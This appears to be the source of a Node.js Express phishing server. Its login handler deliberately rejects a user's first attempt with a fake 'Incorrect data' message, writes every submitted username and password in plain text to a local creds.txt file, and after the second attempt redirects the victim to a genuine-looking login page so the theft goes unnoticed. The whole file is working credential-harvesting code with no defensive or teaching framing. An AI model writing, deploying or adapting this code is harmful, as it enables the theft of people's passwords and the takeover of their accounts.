const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

let attempts = {};

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (!attempts[username]) {
        attempts[username] = { count: 0 };
    }

    attempts[username].count++;

    if (attempts[username].count === 1) {
        res.send('<html><body><p style="color:red;">Incorrect data. Try again.</p><a href="/">Return to login form</a></body></html>');
        fs.appendFile('creds.txt', `Login: ${username}, Password: ${password}\n`, (err) => {
            if (err) throw err;
            console.log('Data successfully written in creds.txt');
        });
    } else if (attempts[username].count === 2) {
        fs.appendFile('creds.txt', `Login: ${username}, Password: ${password}\n`, (err) => {
            if (err) throw err;
            console.log('Data successfully written in в creds.txt');
        });

        res.redirect('https://example.com/login');
    } else {
        attempts[username].count = 0;
        res.send('<html><body><p style="color:red;">Too many tries. Please, try again later.</p></body></html>');
    }
});

app.listen(3000, () => {
    console.log('The server is runnig on the port 3000');
});
